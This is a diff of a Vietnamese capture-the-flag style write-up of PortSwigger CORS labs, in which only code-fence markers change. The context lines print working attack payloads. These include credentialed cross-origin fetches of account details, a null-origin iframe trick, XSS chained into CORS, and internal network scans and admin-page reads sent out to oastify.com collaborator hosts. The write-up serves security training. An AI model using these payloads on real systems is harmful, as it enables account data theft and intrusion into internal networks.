@@ -125,7 +125,7 @@ Nếu thêm Origin bất kì http://abc.com vào request, có thể thấy respo
 
 mình dùng payload sau
 
-```javascript!
+```javascript
 <script>
     fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
         credentials:'include'
@@ -178,7 +178,7 @@ Tuy nhiên, khi thêm header Origin: null thì thấy response có header Access
 
 - mình dùng payload với iframe sanbox như sau rồi đẩy vô phần body của Exploit Server.
 
-```javascript!
+```javascript
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="data:text/html,<script>
     fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
         credentials:'include'
@@ -235,7 +235,7 @@ mình scan trang web với burp suit và thấy được lỗi reflected XSS tr�
 
 - Như vậy, bây giờ chỉ cần truyền payload cors attack sau khi URL-encoded vào trường productId và khiến nạn nhân truy cập vào đường dẫn này thì nó sẽ thực thi payload từ subdomain nhờ XSS và request đến /accountDetails. Payload cors attack:
 
-```javascript!
+```javascript
 <script>
     fetch('https://0aa5000403f87add83078eab00a60075.web-security-academy.net/accountDetails', {
           credentials:'include'
@@ -249,7 +249,7 @@ mình scan trang web với burp suit và thấy được lỗi reflected XSS tr�
 
 Tại exploit-server, truyền payload sau:
 
-```javascript!
+```javascript
 <script>
    document.location = "http://stock.<LAB-DOMAIN>/?productId=<ENCODED-CORS-ATTACK>&storeId=1"
 </script>
@@ -284,7 +284,7 @@ link: https://portswigger.net/web-security/cors/lab-internal-network-pivot-attac
 
 - Ta sẽ sử dụng payload sau để bruteforce tìm địa chỉ internal service port 8080 nằm trong dải 192.168.0.0/24. Nếu tìm được đúng IP thì nó sẽ trả mã nguồn về collaborator mình đang control.
 
-```javascript!
+```javascript
 <script>
 var q = [], collaboratorURL = 'http://lh6a3jy61r4vwcmoze5hj6s34uaky9.oastify.com';
 
@@ -332,7 +332,7 @@ Lưu payload vào exploit-server rồi Deliver exploit to victim. Kết quả đ
 
 - Thử login ứng dụng internal bằng payload sau và xem response trả về.
 
-```javascript!
+```javascript
 <script>
 var collaboratorURL = 'http://vutd7wsn1w8itz4bl0yqhbjhm8szgp4e.oastify.com';
 
@@ -356,7 +356,7 @@ vì chúng ta ko biết tài khoản và mật khẩu của admin nên chúng ta
 
 - tiếp theo truyền payload XSS vào `username : "><img src='+collaboratorURL+'?foundXSS=1>`. Nếu XSS thành công thì sẽ có request đến collaborator chứa tham số foundXSS=1.
 
-```javascript!
+```javascript
 <script>
 function xss(url, text, vector) {
 	location = url + '/login?username='+encodeURIComponent(vector)+'&password=test';
@@ -379,7 +379,7 @@ Deliver exploit to victim, ta nhận được request như mong muốn → inter
 Tận dụng XSS của internal service đó để truy cập trang /admin của ứng dụng hiện tại do ứng dụng trust tất cả các origin từ internal network.
 Payload XSS sẽ là load 1 frame của trang /admin và trả mã HTML về collaborator.
 
-```javascript!
+```javascript
 <script>
 function xss(url, text, vector) {
 	location = url + '/login?username='+encodeURIComponent(vector)+'&password=test';
@@ -405,7 +405,7 @@ và mình đã truy cập được vào trang quản trị
 
 - bây giờ mình chỉ cần xóa carlos với payload XSS
 
-```javascript!
+```javascript
 <script>
 function xss(url, text, vector) {
 	location = url + '/login?username='+encodeURIComponent(vector)+'&password=test';
